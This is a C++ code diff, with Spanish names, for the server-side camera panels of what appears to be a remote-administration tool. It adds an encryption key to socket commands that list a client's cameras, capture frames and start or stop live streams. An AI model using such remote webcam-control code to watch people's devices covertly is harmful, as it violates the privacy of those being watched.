@@ -18,11 +18,12 @@ wxBEGIN_EVENT_TABLE(panelPictureBox, wxFrame)
 	EVT_MENU(EnumCamMenu::ID_Guardar_Frame, panelPictureBox::OnGuardarFrame)
 wxEND_EVENT_TABLE()
 
-panelPictureBox::panelPictureBox(wxWindow* pParent, wxString strTitle, int iCamIndex, SOCKET sck) :
+panelPictureBox::panelPictureBox(wxWindow* pParent, wxString strTitle, int iCamIndex, SOCKET sck, ByteArray c_key) :
 	wxFrame(pParent, EnumCamMenu::ID_Picture_Frame, strTitle + " - Index " + std::to_string(iCamIndex), wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE, "CAM" + std::to_string(iCamIndex)) {
 	
 	this->imageCtrl = new wxStaticBitmap(this, wxID_ANY, wxBitmap(600, 300));
 	this->sckCliente = sck;
+	this->enc_key = c_key;
 
 	wxMenuBar* menuBar = new wxMenuBar();
 	
@@ -81,7 +82,7 @@ void panelPictureBox::OnSingleShot(wxCommandEvent& event) {
 	std::vector<std::string> vcTmp = strSplit(this->GetTitle().ToStdString(), ' ', 10);
 	std::string strComando = vcTmp[vcTmp.size() - 1];
 
-	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::CM_Single);
+	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::CM_Single, this->enc_key);
 }
 
 void panelPictureBox::OnStopLive(wxCommandEvent& event) {
@@ -94,7 +95,7 @@ void panelPictureBox::OnStopLive(wxCommandEvent& event) {
 	std::vector<std::string> vcTmp = strSplit(this->GetTitle().ToStdString(), ' ', 10);
 	std::string strComando = vcTmp[vcTmp.size() - 1];
 
-	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::CM_Live_Stop);
+	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::CM_Live_Stop, this->enc_key);
 }
 
 void panelPictureBox::OnLive(wxCommandEvent& event) {
@@ -107,7 +108,7 @@ void panelPictureBox::OnLive(wxCommandEvent& event) {
 	std::vector<std::string> vcTmp = strSplit(this->GetTitle().ToStdString(), ' ', 10);
 	std::string strComando = vcTmp[vcTmp.size() - 1];
 
-	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::CM_Live_Start);
+	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::CM_Live_Start, this->enc_key);
 }
 
 void panelPictureBox::OnGuardarFrame(wxCommandEvent& event) {
@@ -119,10 +120,11 @@ void panelPictureBox::OnGuardarFrame(wxCommandEvent& event) {
 	}
 }
 
-panelCamara::panelCamara(wxWindow* pParent, SOCKET sck, std::string _strID):
+panelCamara::panelCamara(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key):
 	wxFrame(pParent, EnumCamMenu::ID_Main_Panel, "Camara") {
 
 	this->sckCliente = sck;
+	this->enc_key = c_key;
 	this->SetName(_strID + "-CAM");
 	this->SetTitle("[" + _strID + "] Camara");
 
@@ -160,13 +162,13 @@ void panelCamara::ProcesarLista(const char*& pBuffer) {
 
 void panelCamara::OnRefrescarLista(wxCommandEvent& event) {
 	//Enviar comando para obtener lista
-	p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CM_Lista);
+	p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CM_Lista, this->enc_key);
 }
 
 void panelCamara::OnManageCam(wxCommandEvent& event) {
 	//Abrir nueva frame para administrar la camara seleccionada en el combo box
 	if (this->cam_Devices->GetStringSelection() != "") {
-		this->pictureBox = new panelPictureBox(this, this->GetTitle() + " " + this->cam_Devices->GetStringSelection(), this->cam_Devices->GetSelection(), this->sckCliente);
+		this->pictureBox = new panelPictureBox(this, this->GetTitle() + " " + this->cam_Devices->GetStringSelection(), this->cam_Devices->GetSelection(), this->sckCliente, this->enc_key);
 		this->pictureBox->Show(true);
 	}
 
